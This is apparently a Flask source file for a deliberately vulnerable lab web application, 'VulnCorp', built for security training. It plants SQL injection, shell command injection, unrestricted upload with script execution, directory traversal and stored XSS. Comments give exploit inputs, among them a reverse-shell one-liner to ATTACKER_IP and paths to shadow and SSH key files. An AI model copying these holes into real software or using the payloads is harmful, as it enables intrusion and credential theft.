#!/usr/bin/env python3
"""
VulnCorp Internal Portal - Intentionally Vulnerable Web Application
====================================================================
FOR EDUCATIONAL / LAB USE ONLY. DO NOT DEPLOY IN PRODUCTION.

Attack Vectors:
  1. SQL Injection on login (authentication bypass + data extraction)
  2. Command Injection on network diagnostics page
  3. Unrestricted File Upload (webshell upload)
  4. Directory Traversal on file viewer
  5. Stored XSS on notes page
"""

import os
import sqlite3
import subprocess
import hashlib
from functools import wraps
from flask import (
    Flask, request, render_template, redirect,
    url_for, session, flash, send_from_directory, g
)

app = Flask(__name__)
app.secret_key = "supersecretkey123"  # Vuln: Hardcoded secret key

DATABASE = "/opt/vulncorp/db/vulncorp.db"
UPLOAD_FOLDER = "/opt/vulncorp/app/uploads"
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# ---------------------------------------------------------------------------
# Database helpers
# ---------------------------------------------------------------------------

def get_db():
    """Get a database connection, stored on the request context."""
    if "db" not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(exception):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    """Initialise the database with tables and seed data."""
    os.makedirs(os.path.dirname(DATABASE), exist_ok=True)
    db = sqlite3.connect(DATABASE)
    cur = db.cursor()

    # -- Users table
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id    INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            role     TEXT DEFAULT 'user'
        )
    """)

    # -- Notes table (stored XSS target)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS notes (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            author  TEXT,
            content TEXT,
            created DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)

    # -- Internal credentials table (pivot clue)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS internal_credentials (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            service  TEXT,
            host     TEXT,
            port     INTEGER,
            username TEXT,
            password TEXT,
            notes    TEXT
        )
    """)

    # Seed users  (passwords stored as plaintext — intentional vuln)
    users = [
        ("admin",   "admin@vulncorp2024", "admin"),
        ("webdev",  "devpass123",         "user"),
        ("dbadmin", "mysql_r00t!",        "user"),
        ("backup",  "backup2024$",        "user"),
    ]
    for u, p, r in users:
        try:
            cur.execute(
                "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
                (u, p, r),
            )
        except sqlite3.IntegrityError:
            pass

    # Seed internal credentials — PIVOT CLUE to Machine 2
    pivot_creds = [
        ("SSH",   "192.168.56.102", 22,   "sysadmin",  "Pr0d#Server!99",
         "Production DB server - DO NOT share"),
        ("MySQL", "192.168.56.102", 3306, "root",      "toor_mysql@prod",
         "Production MySQL - weekly backup at 2AM"),
        ("FTP",   "192.168.56.103", 21,   "ftpuser",   "ftp_upload#2024",
         "File server for marketing assets"),
        ("RDP",   "10.10.10.50",    3389, "Administrator", "W1nd0ws@Admin!",
         "Windows jump box - maintenance only"),
    ]
    for svc, host, port, user, pwd, note in pivot_creds:
        try:
            cur.execute(
                "INSERT INTO internal_credentials "
                "(service, host, port, username, password, notes) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (svc, host, port, user, pwd, note),
            )
        except sqlite3.IntegrityError:
            pass

    # Seed some notes
    notes_data = [
        ("admin",  "Remember to patch the server next quarter. Low priority."),
        ("webdev", "The file upload page needs input validation. TODO."),
        ("admin",  "New DB server at 192.168.56.102 is ready. Creds in the internal_credentials table."),
        ("dbadmin", "Backup script at /opt/scripts/cleanup.sh needs review — runs as root via cron."),
    ]
    for author, content in notes_data:
        cur.execute(
            "INSERT INTO notes (author, content) VALUES (?, ?)",
            (author, content),
        )

    db.commit()
    db.close()


# ---------------------------------------------------------------------------
# Auth decorator
# ---------------------------------------------------------------------------

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user" not in session:
            flash("Please log in first.", "warning")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get("role") != "admin":
            flash("Admin access required.", "danger")
            return redirect(url_for("dashboard"))
        return f(*args, **kwargs)
    return decorated


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    return render_template("index.html")


# ---- LOGIN (SQL Injection) ------------------------------------------------

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # *** VULNERABLE: Raw string formatting in SQL query ***
        # Bypass: username = admin' OR '1'='1' --    password = anything
        # Or:     username = ' UNION SELECT 1,'admin','admin','admin' --
        query = (
            f"SELECT * FROM users WHERE username='{username}' "
            f"AND password='{password}'"
        )

        db = get_db()
        try:
            result = db.execute(query).fetchone()
        except Exception as e:
            flash(f"Database error: {e}", "danger")
            return render_template("login.html")

        if result:
            session["user"] = result["username"]
            session["role"] = result["role"]
            flash(f"Welcome back, {result['username']}!", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Invalid credentials.", "danger")

    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    flash("Logged out.", "info")
    return redirect(url_for("index"))


# ---- DASHBOARD -----------------------------------------------------------

@app.route("/dashboard")
@login_required
def dashboard():
    return render_template("dashboard.html")


# ---- NETWORK TOOLS (Command Injection) -----------------------------------

@app.route("/nettools", methods=["GET", "POST"])
@login_required
def nettools():
    output = ""
    if request.method == "POST":
        target = request.form.get("target", "")

        # *** VULNERABLE: Direct shell command injection ***
        # Exploit: 127.0.0.1; whoami
        #          127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
        cmd = f"ping -c 3 {target}"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=10
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = "Command timed out."
        except Exception as e:
            output = f"Error: {e}"

    return render_template("nettools.html", output=output)


# ---- FILE UPLOAD (Unrestricted Upload) ------------------------------------

@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    message = ""
    if request.method == "POST":
        f = request.files.get("file")
        if f and f.filename:
            # *** VULNERABLE: No file type validation ***
            # Upload a .php, .py, .sh, .jsp, or .phtml webshell
            filepath = os.path.join(app.config["UPLOAD_FOLDER"], f.filename)
            f.save(filepath)
            os.chmod(filepath, 0o755)  # Make executable — extra dangerous
            message = f"File '{f.filename}' uploaded successfully!"
        else:
            message = "No file selected."

    # List uploaded files
    files = []
    if os.path.isdir(UPLOAD_FOLDER):
        files = os.listdir(UPLOAD_FOLDER)

    return render_template("upload.html", message=message, files=files)


@app.route("/uploads/<filename>")
@login_required
def uploaded_file(filename):
    """Serve uploaded files — allows executing uploaded webshells."""
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


# ---- FILE VIEWER (Directory Traversal) ------------------------------------

@app.route("/viewer")
@login_required
def viewer():
    # *** VULNERABLE: Directory traversal ***
    # Exploit: /viewer?file=../../../etc/passwd
    #          /viewer?file=../../../etc/shadow  (if readable)
    #          /viewer?file=../../../root/.ssh/id_rsa
    filename = request.args.get("file", "")
    content = ""
    if filename:
        # Intentionally does NOT sanitise path
        base_path = "/opt/vulncorp/app/static/docs"
        filepath = os.path.join(base_path, filename)
        try:
            with open(filepath, "r") as fh:
                content = fh.read()
        except Exception as e:
            content = f"Error reading file: {e}"

    return render_template("viewer.html", filename=filename, content=content)


# ---- NOTES (Stored XSS) ---------------------------------------------------

@app.route("/notes", methods=["GET", "POST"])
@login_required
def notes():
    db = get_db()

    if request.method == "POST":
        content = request.form.get("content", "")
        author = session.get("user", "anonymous")
        # *** VULNERABLE: Content stored without sanitisation (Stored XSS) ***
        db.execute(
            "INSERT INTO notes (author, content) VALUES (?, ?)",
            (author, content),
        )
        db.commit()
        flash("Note saved!", "success")

    all_notes = db.execute(
        "SELECT * FROM notes ORDER BY created DESC"
    ).fetchall()

    return render_template("notes.html", notes=all_notes)


# ---- ADMIN PANEL (credential view — after SQLi or admin login) ------------

@app.route("/admin")
@login_required
@admin_required
def admin_panel():
    db = get_db()
    users = db.execute("SELECT * FROM users").fetchall()
    creds = db.execute("SELECT * FROM internal_credentials").fetchall()
    return render_template("admin.html", users=users, creds=creds)


# ---- ROBOTS.TXT (Information Disclosure) -----------------------------------

@app.route("/robots.txt")
def robots():
    # Reveals hidden admin paths
    return (
        "User-agent: *\n"
        "Disallow: /admin\n"
        "Disallow: /uploads\n"
        "Disallow: /viewer\n"
        "Disallow: /server-status\n"
        "Disallow: /backup\n"
    ), 200, {"Content-Type": "text/plain"}


# ---- SERVER STATUS (Information Disclosure) --------------------------------

@app.route("/server-status")
def server_status():
    """Exposes server internals — intentional information disclosure."""
    import platform
    info = {
        "hostname": os.uname().nodename if hasattr(os, "uname") else "unknown",
        "os": platform.platform(),
        "python": platform.python_version(),
        "user": os.getenv("USER", "unknown"),
        "path": os.getenv("PATH", ""),
        "cwd": os.getcwd(),
        "db_path": DATABASE,
        "upload_dir": UPLOAD_FOLDER,
        "internal_note": "MySQL on 192.168.56.102:3306 — see internal_credentials table",
    }
    return info, 200


# ---------------------------------------------------------------------------
# CGI-style script executor (for uploaded scripts)
# ---------------------------------------------------------------------------

@app.route("/cgi/<script>")
@login_required
def cgi_exec(script):
    """Execute uploaded scripts — extremely dangerous, intentional."""
    script_path = os.path.join(UPLOAD_FOLDER, script)
    if os.path.exists(script_path):
        try:
            result = subprocess.run(
                [script_path],
                capture_output=True, text=True, timeout=10
            )
            return f"<pre>{result.stdout}\n{result.stderr}</pre>"
        except Exception as e:
            return f"<pre>Error: {e}</pre>"
    return "Script not found.", 404


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    init_db()
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    # Vuln: Debug mode ON, listening on all interfaces
    app.run(host="0.0.0.0", port=80, debug=True)
